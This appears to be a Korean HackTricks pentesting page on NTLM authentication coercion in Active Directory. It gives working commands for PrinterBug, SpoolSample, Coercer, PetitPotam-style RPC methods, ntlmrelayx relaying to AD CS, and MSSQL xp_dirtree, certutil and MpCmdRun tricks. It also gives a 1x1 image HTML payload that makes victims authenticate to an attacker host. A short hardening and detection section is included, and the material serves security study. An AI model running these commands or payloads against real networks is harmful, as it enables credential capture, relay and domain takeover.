# NTLM 권한 인증 강제

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)는 타사 의존성을 피하기 위해 MIDL compiler를 사용해 C#으로 작성된 **원격 인증 트리거 모음**입니다.

## Spooler Service 악용

_**Print Spooler**_ 서비스가 **활성화되어 있다면**, 이미 알고 있는 AD 자격 증명을 사용해 Domain Controller의 프린트 서버에 새 인쇄 작업이 있는지 **요청**하고, 알림을 **특정 시스템으로 보내도록** 지정할 수 있습니다.\
프린터가 알림을 임의의 시스템으로 보내면 해당 **시스템에 인증**해야 한다는 점에 유의하세요. 따라서 공격자는 _**Print Spooler**_ 서비스가 임의의 시스템에 인증하도록 유도할 수 있으며, 서비스는 이 인증에 **컴퓨터 계정을 사용**합니다.

내부적으로 고전적인 **PrinterBug** 프리미티브는 **`RpcRemoteFindFirstPrinterChangeNotificationEx`**를 **`\\PIPE\\spoolss`**를 통해 악용합니다. 공격자는 먼저 프린터/서버 핸들을 연 다음 `pszLocalMachine`에 가짜 클라이언트 이름을 지정하여 대상 spooler가 **공격자가 제어하는 호스트로 돌아가는** 알림 채널을 만들도록 합니다. 따라서 이 동작은 직접적인 코드 실행이 아니라 **아웃바운드 인증 유도**입니다.<sup>[[2]](#references)</sup>\
spooler 자체의 **RCE/LPE**를 찾고 있다면 [PrintNightmare](printnightmare.md)를 확인하세요. 이 페이지는 **인증 유도와 relay**에 초점을 맞춥니다.

### 도메인의 Windows 서버 찾기

PowerShell을 사용해 Windows 호스트를 나열하세요. 서버는 일반적으로 우선순위가 가장 높은 대상이므로 먼저 서버에 집중하세요:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Spooler 서비스가 수신 대기 중인지 확인

약간 수정한 @mysmartlogin(Vincent Le Toux)의 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)를 사용해 Spooler Service가 수신 대기 중인지 확인합니다:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Linux에서 `rpcdump.py`를 사용해 **MS-RPRN** 프로토콜을 찾아볼 수도 있습니다:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

또는 Linux에서 **NetExec/CrackMapExec**으로 호스트를 빠르게 테스트할 수도 있습니다:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

spooler endpoint가 존재하는지만 확인하는 대신 **coercion surfaces를 열거**하려면 **Coercer scan mode**를 사용하세요:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

EPM에서 endpoint를 확인해도 print RPC interface가 등록되어 있다는 뜻일 뿐이므로 유용합니다. 이는 현재 권한으로 모든 coercion method에 접근할 수 있거나 호스트가 사용할 수 있는 인증 흐름을 생성한다는 보장은 **없습니다**.

### 서비스에 임의의 호스트로 인증하도록 요청하기

[원본 repository의 SpoolSample](https://github.com/leechristensen/SpoolSample)을 컴파일할 수 있습니다.

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

또는 Linux를 사용 중이라면 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 또는 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)를 사용하세요.

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

**Coercer**를 사용하면 스풀러 인터페이스를 직접 대상으로 삼아 어떤 RPC 메서드가 노출되어 있는지 추측할 필요가 없습니다:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### 최신 RPC-over-TCP 콜백

`RpcRemoteFindFirstPrinterChangeNotificationEx` 호출이 성공했다고 해서 TCP/445로 트래픽이 반드시 발생한다고 가정하지 마세요. **Windows 11 22H2 이상에서는 기본적으로 인쇄 통신에 RPC over TCP를 사용합니다**. 정책 또는 `RpcUseNamedPipeProtocol=1` 설정으로 복원하지 않는 한 RPC over named pipes는 비활성화됩니다. 따라서 기존 SMB 전용 리스너는 트리거가 전송되었다고 보고하면서도 콜백을 전혀 수신하지 못할 수 있습니다. Microsoft는 일반적인 인쇄 RPC에 TCP/135(Endpoint Mapper)와 동적 RPC 포트를 사용한다고 문서화하고 있으며, 조직은 이 포트 범위를 제한하거나 고정된 인쇄 RPC 포트를 선택할 수 있습니다.<sup>[[10]](#references)</sup>

현재 **Impacket `ntlmrelayx.py`**에는 RPC relay server와 소규모 Endpoint Mapper가 포함되어 있으며, TCP/135에서 기본적으로 활성화됩니다. 이 지원은 2025년 6월에 PrinterBug-to-AD-CS 체인이 실제로 시연되면서 병합되었으며, 피해자가 SMB/WebDAV로 fallback하지 않더라도 인증된 RPC 콜백을 relay할 수 있습니다.<sup>[[11]](#references)</sup>

RPC relay/EPM 지원은 **Impacket 0.13.0 이상**에 포함되어 있습니다. TCP/135 리스너가 없는 문제를 디버깅하기 전에, 패키지에 포함된 이전 버전의 `ntlmrelayx.py`가 실행되고 있지 않은지 확인하세요. 도움말 출력에 RPC-server 스위치 두 개가 표시되어야 합니다.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

`Setting up RPC Server on port 135` 및 `RPCD: Received connection`을 relay 출력에서 찾습니다. RPC call이 예상된 오류를 반환하지만 listener에 아무것도 도달하지 않으면 victim의 print RPC transport policy, outbound filtering, DNS resolution 및 다른 process가 이미 TCP/135를 사용 중인지 확인합니다. 또한 `ntlmrelayx`를 `--no-rpc-server` 옵션으로 시작하지 않았는지 확인합니다.

### WebClient를 사용해 SMB 대신 HTTP 강제하기

아직 **RPC over named pipes**를 사용하는 시스템(legacy 빌드 또는 policy가 복원된 동작)에서는 일반적인 PrinterBug로 `\\attacker\share`에 대한 **SMB** authentication이 발생하는 경우가 많습니다. 이는 여전히 **capture**, **HTTP targets로 relay** 또는 **SMB signing이 없는 경우 relay**에 유용합니다.\
하지만 **SMB에서 SMB로의 relay**는 **SMB signing**으로 차단되는 경우가 많으므로, operator는 **HTTP/WebDAV** authentication을 강제하는 방식을 선호할 수 있습니다. 이는 위에서 설명한 RPC-over-TCP 동작에 대한 대안이 아닙니다.

대상에서 **WebClient** service가 실행 중이라면, Windows가 **WebDAV over HTTP**를 사용하도록 listener를 지정할 수 있습니다:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

이는 **`ntlmrelayx --adcs`** 또는 다른 HTTP relay 대상과 연계할 때 특히 유용합니다. 강제로 인증을 유도한 연결에서 SMB relay가 가능한지에 의존하지 않아도 되기 때문입니다. 단, HTTP/WebDAV 방식이 작동하려면 피해자에서 **WebClient가 실행 중이어야 합니다**.

### Unconstrained Delegation과 결합

공격자가 [Unconstrained Delegation](unconstrained-delegation.md)이 구성된 컴퓨터를 침해했다면, **프린터가 해당 컴퓨터에 인증하도록 유도할 수 있습니다**. 그러면 프린터 컴퓨터 계정의 **TGT**가 Unconstrained Delegation 호스트의 메모리에 캐시되고, 공격자는 이를 가져와 [Pass the Ticket](pass-the-ticket.md)으로 재사용할 수 있습니다.

### 탐지 및 보안 강화 참고 사항

인쇄 기능을 사용하지 않는 DC, PAW 또는 서버에서 PrinterBug를 제거하는 가장 확실한 방법은 Spooler를 중지하고 비활성화하는 것입니다. 인쇄가 필요한 경우 콜백 경로의 TCP/445를 차단하는 것만으로 충분하다고 가정하지 말고, 가능한 모든 relay 대상(SMB server signing, LDAP signing/channel binding, AD CS와 같은 HTTP 서비스의 EPA)을 강화해야 합니다.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

호스트에서 여전히 **로컬 인쇄**가 필요하다면, 범위를 좁힌 제어 방법으로 GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`를 설정할 수 있습니다. 이렇게 하면 서비스를 로컬에서 사용할 수 있는 상태로 유지하면서 스풀러가 원격 클라이언트 연결(및 프린터 공유)을 수락하지 못하게 합니다. 적용 후 스풀러를 다시 시작하고 위의 MS-RPRN 연결 가능성 검사를 반복하세요.<sup>[[13]](#references)</sup>

탐지 시에는 MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`에 대한 인증된 호출, 특히 로컬이 아닌 콜백 값을 사용하는 opnum 62/65와 스풀러 호스트에서 즉시 발생하는 아웃바운드 SMB, HTTP 또는 RPC 연결을 연관 지어야 합니다. 현재 인쇄 스택에서는 콜백이 RPC-over-TCP를 사용할 수 있으므로 `\PIPE\spoolss` 접근 여부만 확인하지 말고 **인터페이스 UUID/opnum 및 소스/대상 쌍**을 기준으로 정상 동작을 파악하세요.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC 인증 강제

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC 경로 강제 인증 매트릭스 (아웃바운드 인증을 유발하는 인터페이스/opnum)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - 도구: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - 참고: 같은 스풀러 파이프의 비동기 인쇄 인터페이스입니다. 특정 호스트에서 연결 가능한 메서드를 열거하려면 Coercer를 사용하세요.<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (\\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon을 통해서도 사용 가능)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - 흔히 악용되는 Opnums: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - 도구: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - 도구: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - 도구: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - 도구: CheeseOunce<sup>[[1]](#references)</sup>

참고: 이러한 메서드는 UNC 경로(예: `\\attacker\share`)를 전달할 수 있는 매개변수를 받습니다. 경로가 처리되면 Windows는 해당 UNC에 시스템/사용자 컨텍스트로 인증하므로 NetNTLM 캡처 또는 릴레이가 가능합니다.\
스풀러 악용에서는 프로토콜 사양에 서버가 `pszLocalMachine`으로 지정된 클라이언트에 알림 채널을 생성한다고 명시되어 있으므로, **MS-RPRN opnum 65**가 여전히 가장 흔하고 문서화가 잘된 프리미티브입니다.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) 강제 인증
- 인터페이스: \\PIPE\\even을 통한 MS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- 호출 시그니처: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- 효과: 대상은 제공된 백업 로그 경로를 열려고 시도하며, 공격자가 제어하는 UNC에 인증합니다.<sup>[[1]](#references)</sup>
- 실제 활용: Tier 0 자산(DC/RODC/Citrix 등)이 NetNTLM을 보내도록 유도한 다음, 이를 AD CS 엔드포인트(ESC8/ESC11 시나리오) 또는 다른 권한 있는 서비스로 릴레이합니다.<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` 공격은 **Exchange Server의 `PushSubscription` 기능**에서 발견된 결함을 이용합니다. 이 기능을 통해 사서함이 있는 모든 도메인 사용자는 Exchange 서버가 클라이언트가 제공한 임의의 호스트에 HTTP로 인증하도록 강제할 수 있습니다.

기본적으로 **Exchange 서비스는 SYSTEM으로 실행**되며 과도한 권한이 부여되어 있습니다(구체적으로, **2019 Cumulative Update 이전에는 도메인에 대한 WriteDacl 권한**이 있습니다). 이 결함을 악용하면 정보를 LDAP로 **릴레이한 뒤 도메인 NTDS 데이터베이스를 추출**할 수 있습니다. LDAP로 릴레이할 수 없는 경우에도 이 결함을 이용해 도메인 내 다른 호스트로 릴레이하고 인증할 수 있습니다. 이 공격을 성공적으로 악용하면 인증된 도메인 사용자 계정만으로 Domain Admin에 즉시 접근할 수 있습니다.

## Windows 내부에서

이미 Windows 시스템 내부에 있다면 권한이 높은 계정을 사용해 Windows가 서버에 연결하도록 다음과 같이 강제할 수 있습니다.

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

또는 다음 기법을 사용할 수도 있습니다: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin(Microsoft 서명 바이너리)을 사용해 NTLM 인증을 강제할 수 있습니다:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### 이메일을 통한 방법

침해하려는 머신에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 다음과 같이 **1x1 이미지가 포함된 이메일**을 보내면 됩니다.

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

피해자가 이를 열면 Windows에서 인증을 시도합니다.

### MitM

MitM 공격을 수행하고 피해자가 보는 페이지에 HTML을 삽입할 수 있다면, 다음과 같은 이미지를 삽입해 보세요:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## NTLM 인증을 강제로 유도하고 피싱하는 다른 방법


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 크래킹

[NTLMv1 challenge를 캡처할 수 있다면, 여기에서 크래킹 방법을 확인하세요](../ntlm/index.html#ntlmv1-attack).\
_기억하세요. NTLMv1을 크래킹하려면 Responder challenge를 "1122334455667788"로 설정해야 합니다._



## References

- [1] [Unit 42 – 인증 강제 유도의 지속적인 진화](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog 원격 프로토콜](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Windows 11의 인쇄 RPC 연결 업데이트](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – ntlmrelayx용 RPC 릴레이 서버 및 Endpoint Mapper](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 릴리스](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Print Spooler의 클라이언트 연결 수락 허용](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
